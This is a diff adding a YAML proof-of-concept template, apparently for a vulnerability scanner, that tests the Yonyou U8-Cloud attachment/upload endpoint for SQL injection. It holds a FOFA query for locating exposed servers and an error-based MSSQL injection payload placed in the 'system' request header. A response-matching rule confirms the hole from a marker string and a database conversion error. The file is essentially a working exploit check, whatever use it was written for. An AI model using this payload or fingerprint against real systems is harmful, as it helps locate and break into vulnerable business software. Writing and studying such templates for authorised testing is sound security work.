@@ -1,0 +1,20 @@
+id: poc-yaml-yongyou-u8-cloud-upload-sqli
+info:
+  name: 用友U8-Cloud attachment/upload接口存在SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友-NC-Cloud
+  fofa: app="用友-U8-Cloud"
+requests:
+- method: GET
+  path: /u8cloud/api/hr/attachment/upload?mssql_error
+  headers:
+    system: -1' or 1=(SELECT CHAR(113)+CHAR(120)+CHAR(122)+CHAR(119)+CHAR(122)+CHAR(120)+CHAR(122)+CHAR(119)+CHAR(122)+CHAR(120)+CHAR(121)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113))--+
+  data: '{"credential":"xadmin","password":"o2"}
+
+    '
+  expression: "status_code == 200 && \ncontains(body,\"qxzwzxzwzxyxzpq\") &&\ncontains(body,\"\
+    Conversion failed\") &&\n!contains(body,\"<\")\n"
+variables: {}
+transport: http
